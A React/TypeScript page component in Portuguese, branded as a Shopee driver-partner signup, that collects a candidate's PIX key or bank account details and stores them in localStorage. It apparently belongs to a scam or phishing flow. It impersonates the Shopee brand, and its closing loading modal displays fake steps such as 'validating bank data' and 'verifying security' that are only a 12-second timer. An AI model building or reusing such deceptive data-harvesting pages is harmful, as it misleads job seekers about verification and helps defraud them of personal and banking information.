import React, { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';

import Header from '@/components/Header';
import Footer from '@/components/Footer';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { useToast } from '@/hooks/use-toast';
import { LoadingModal } from '@/components/LoadingModal';
import { useScrollTop } from '@/hooks/use-scroll-top';

// Definindo os schemas e tipos para validação de formulário
const pixSchema = z.object({
  tipoChave: z.enum(['cpf', 'email', 'telefone', 'aleatoria']),
  chave: z.string().min(1, "A chave PIX é obrigatória"),
});

const tedSchema = z.object({
  banco: z.string().min(3, "Banco inválido"),
  agencia: z.string().min(4, "Agência inválida"),
  conta: z.string().min(5, "Conta inválida"),
  tipoConta: z.enum(['corrente', 'poupanca']),
});

type PixFormValues = z.infer<typeof pixSchema>;
type TedFormValues = z.infer<typeof tedSchema>;

// Tipos de método de pagamento
enum MetodoPagamento {
  PIX = 'pix',
  TED = 'ted',
  NENHUM = 'nenhum'
}

const Recebedor: React.FC = () => {
  // Aplica o scroll para o topo quando o componente é montado
  useScrollTop();
  
  const [, navigate] = useLocation();
  const { toast } = useToast();
  const [metodo, setMetodo] = useState<MetodoPagamento>(MetodoPagamento.NENHUM);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [candidatoData, setCandidatoData] = useState<any>(null);
  
  // Lista dos 6 maiores bancos do Brasil
  const principaisBancos = [
    "Banco do Brasil",
    "Caixa Econômica Federal",
    "Bradesco",
    "Itaú Unibanco",
    "Santander",
    "Nubank"
  ];

  // Carregar os dados do candidato ao iniciar
  useEffect(() => {
    const candidatoDataString = localStorage.getItem('candidato_data');
    if (candidatoDataString) {
      const data = JSON.parse(candidatoDataString);
      setCandidatoData(data);
    }
  }, []);
  
  // Form para PIX
  const pixForm = useForm<PixFormValues>({
    resolver: zodResolver(pixSchema),
    defaultValues: {
      tipoChave: 'cpf',
      chave: '',
    }
  });

  // Form para TED
  const tedForm = useForm<TedFormValues>({
    resolver: zodResolver(tedSchema),
    defaultValues: {
      banco: principaisBancos[0],
      agencia: '',
      conta: '',
      tipoConta: 'corrente',
    }
  });
  
  // Preencher automaticamente o campo chave PIX quando o tipo de chave muda
  useEffect(() => {
    const tipoChave = pixForm.watch('tipoChave');
    
    if (candidatoData && tipoChave === 'cpf' && candidatoData.cpf) {
      pixForm.setValue('chave', candidatoData.cpf);
    } else if (candidatoData && tipoChave === 'email' && candidatoData.email) {
      pixForm.setValue('chave', candidatoData.email);
    } else if (tipoChave === 'telefone' || tipoChave === 'aleatoria') {
      pixForm.setValue('chave', '');
    }
  }, [pixForm.watch('tipoChave'), candidatoData, pixForm]);

  const handlePixSubmit = (data: PixFormValues) => {
    setIsSubmitting(true);
    
    try {
      // Salvando dados no localStorage
      const dadosPagamento = {
        metodo: MetodoPagamento.PIX,
        ...data
      };
      
      localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
      
      // Iniciar processo de carregamento
      setShowLoadingModal(true);
    } catch (error) {
      toast({
        title: "Erro ao salvar dados",
        description: "Ocorreu um erro ao processar suas informações. Tente novamente.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const handleTedSubmit = (data: TedFormValues) => {
    setIsSubmitting(true);
    
    try {
      // Salvando dados no localStorage
      const dadosPagamento = {
        metodo: MetodoPagamento.TED,
        ...data
      };
      
      localStorage.setItem('pagamento_data', JSON.stringify(dadosPagamento));
      
      // Iniciar processo de carregamento
      setShowLoadingModal(true);
    } catch (error) {
      toast({
        title: "Erro ao salvar dados",
        description: "Ocorreu um erro ao processar suas informações. Tente novamente.",
        variant: "destructive",
      });
      setIsSubmitting(false);
    }
  };

  const handleLoadingComplete = () => {
    setShowLoadingModal(false);
    navigate('/finalizacao');
  };

  const getInputMode = (tipoChave: string) => {
    switch (tipoChave) {
      case 'cpf':
      case 'telefone':
        return 'numeric';
      case 'email':
      case 'aleatoria':
      default:
        return 'text';
    }
  };

  return (
    <div className="bg-white min-h-screen flex flex-col">
      <Header />
      
      <div className="w-full bg-[#EE4E2E] py-1 px-6 flex items-center relative overflow-hidden">
        {/* Meia-lua no canto direito */}
        <div className="absolute right-0 top-0 bottom-0 w-32 h-full rounded-l-full bg-[#E83D22]"></div>
        
        <div className="flex items-center relative z-10">
          <div className="text-white mr-3">
            <i className="fas fa-chevron-right text-3xl font-black" style={{color: 'white'}}></i>
          </div>
          <div className="leading-none">
            <h1 className="text-base font-bold text-white mb-0">Motorista Parceiro</h1>
            <p className="text-white text-sm mt-0" style={{transform: 'translateY(-2px)'}}>Shopee</p>
          </div>
        </div>
      </div>
      
      <div className="flex-grow container mx-auto px-2 py-8 w-full">
        <div className="w-full mx-auto p-6 mb-8">
          <h1 className="text-3xl font-bold text-center mb-8 text-gray-800">Método de Recebimento</h1>
          
          <p className="text-center text-gray-600 mb-8">
            Como você deseja receber os pagamentos das suas entregas?
          </p>
          
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
            <Card 
              className={`cursor-pointer transition-all p-6 ${metodo === MetodoPagamento.PIX ? 'border-[#E83D22] border-2 bg-[#FFF8F6]' : 'border-gray-200 hover:border-[#E83D2280]'}`}
              onClick={() => setMetodo(MetodoPagamento.PIX)}
            >
              <div className="flex flex-col items-center text-center">
                <div className="w-16 h-16 rounded-full flex items-center justify-center mb-4">
                  <img 
                    src="https://img.icons8.com/fluent/512/pix.png" 
                    alt="Ícone PIX" 
                    className="w-16 h-16"
                  />
                </div>
                <h3 className="text-xl font-semibold mb-2">Via PIX</h3>
                <p className="text-gray-600 text-sm">
                  Receba o pagamento diretamente na sua conta via PIX.
                  Transferência instantânea e sem taxas.
                </p>
              </div>
            </Card>
            
            <Card 
              className={`cursor-pointer transition-all p-6 ${metodo === MetodoPagamento.TED ? 'border-[#E83D22] border-2 bg-[#FFF8F6]' : 'border-gray-200 hover:border-[#E83D2280]'}`}
              onClick={() => setMetodo(MetodoPagamento.TED)}
            >
              <div className="flex flex-col items-center text-center">
                <div className="w-16 h-16 bg-[#E83D22] rounded-full flex items-center justify-center mb-4 text-white">
                  <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                    <rect x="2" y="5" width="20" height="14" rx="2"></rect>
                    <line x1="2" y1="10" x2="22" y2="10"></line>
                  </svg>
                </div>
                <h3 className="text-xl font-semibold mb-2">Via TED Bancária</h3>
                <p className="text-gray-600 text-sm">
                  Receba o pagamento na sua conta bancária por transferência eletrônica.
                  Disponível para todos os bancos.
                </p>
              </div>
            </Card>
          </div>
          
          {metodo === MetodoPagamento.PIX && (
            <div className="mt-6 p-4 bg-white border rounded-lg">
              <h3 className="text-lg font-semibold mb-4">Informe sua chave PIX</h3>
              
              <form onSubmit={pixForm.handleSubmit(handlePixSubmit)} className="space-y-4">
                <div>
                  <label htmlFor="tipoChave" className="block text-base font-medium text-gray-800 mb-2">
                    Tipo de chave
                  </label>
                  <Select
                    onValueChange={(value) => pixForm.setValue('tipoChave', value as any)}
                    defaultValue={pixForm.watch('tipoChave')}
                  >
                    <SelectTrigger className="w-full">
                      <SelectValue placeholder="Selecione o tipo de chave PIX" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="cpf">CPF</SelectItem>
                      <SelectItem value="email">E-mail</SelectItem>
                      <SelectItem value="telefone">Telefone</SelectItem>
                      <SelectItem value="aleatoria">Chave Aleatória</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                
                <div>
                  <label htmlFor="chave" className="block text-base font-medium text-gray-800 mb-2">
                    Chave PIX
                  </label>
                  <Input
                    id="chave"
                    {...pixForm.register('chave')}
                    placeholder="Digite sua chave PIX"
                    className={pixForm.formState.errors.chave ? 'border-red-500' : ''}
                    inputMode={getInputMode(pixForm.watch('tipoChave')) as any}
                  />
                  {pixForm.formState.errors.chave && (
                    <p className="mt-1 text-sm text-red-600">{pixForm.formState.errors.chave.message}</p>
                  )}
                </div>
                
                <Button
                  type="submit"
                  className="w-full bg-[#E83D22] hover:bg-[#d73920] text-white font-medium py-6 text-base rounded-[3px]"
                  disabled={isSubmitting}
                  style={{ height: '50px' }}
                >
                  {isSubmitting ? 'Processando...' : 'Confirmar PIX'}
                </Button>
              </form>
            </div>
          )}
          
          {metodo === MetodoPagamento.TED && (
            <div className="mt-6 p-4 bg-white border rounded-lg">
              <h3 className="text-lg font-semibold mb-4">Informe seus dados bancários</h3>
              
              <form onSubmit={tedForm.handleSubmit(handleTedSubmit)} className="space-y-4">
                <div>
                  <label htmlFor="banco" className="block text-base font-medium text-gray-800 mb-2">
                    Banco
                  </label>
                  <Select
                    onValueChange={(value) => tedForm.setValue('banco', value)}
                    defaultValue={tedForm.watch('banco')}
                  >
                    <SelectTrigger className="w-full">
                      <SelectValue placeholder="Selecione seu banco" />
                    </SelectTrigger>
                    <SelectContent>
                      {principaisBancos.map((banco, index) => (
                        <SelectItem key={index} value={banco}>{banco}</SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  {tedForm.formState.errors.banco && (
                    <p className="mt-1 text-sm text-red-600">{tedForm.formState.errors.banco.message}</p>
                  )}
                </div>
                
                <div>
                  <label htmlFor="agencia" className="block text-base font-medium text-gray-800 mb-2">
                    Agência
                  </label>
                  <Input
                    id="agencia"
                    {...tedForm.register('agencia')}
                    placeholder="Número da agência (sem dígito)"
                    className={tedForm.formState.errors.agencia ? 'border-red-500' : ''}
                    inputMode="numeric"
                  />
                  {tedForm.formState.errors.agencia && (
                    <p className="mt-1 text-sm text-red-600">{tedForm.formState.errors.agencia.message}</p>
                  )}
                </div>
                
                <div>
                  <label htmlFor="conta" className="block text-base font-medium text-gray-800 mb-2">
                    Conta
                  </label>
                  <Input
                    id="conta"
                    {...tedForm.register('conta')}
                    placeholder="Número da conta com dígito"
                    className={tedForm.formState.errors.conta ? 'border-red-500' : ''}
                    inputMode="numeric"
                  />
                  {tedForm.formState.errors.conta && (
                    <p className="mt-1 text-sm text-red-600">{tedForm.formState.errors.conta.message}</p>
                  )}
                </div>
                
                <div>
                  <label htmlFor="tipoConta" className="block text-base font-medium text-gray-800 mb-2">
                    Tipo de conta
                  </label>
                  <Select
                    onValueChange={(value) => tedForm.setValue('tipoConta', value as any)}
                    defaultValue={tedForm.watch('tipoConta')}
                  >
                    <SelectTrigger className="w-full">
                      <SelectValue placeholder="Selecione o tipo de conta" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="corrente">Conta Corrente</SelectItem>
                      <SelectItem value="poupanca">Conta Poupança</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
                
                <Button
                  type="submit"
                  className="w-full bg-[#E83D22] hover:bg-[#d73920] text-white font-medium py-6 text-base rounded-[3px]"
                  disabled={isSubmitting}
                  style={{ height: '50px' }}
                >
                  {isSubmitting ? 'Processando...' : 'Confirmar dados bancários'}
                </Button>
              </form>
            </div>
          )}
        </div>
      </div>
      
      <Footer />
      
      <LoadingModal
        isOpen={showLoadingModal}
        onComplete={handleLoadingComplete}
        title="Processando Informações"
        loadingSteps={[
          "Validando dados bancários",
          "Registrando método de recebimento",
          "Configurando conta para pagamentos",
          "Verificando segurança das informações",
          "Concluindo registro financeiro"
        ]}
        completionMessage="Método de pagamento registrado com sucesso!"
        loadingTime={12000}
      />
    </div>
  );
};

export default Recebedor;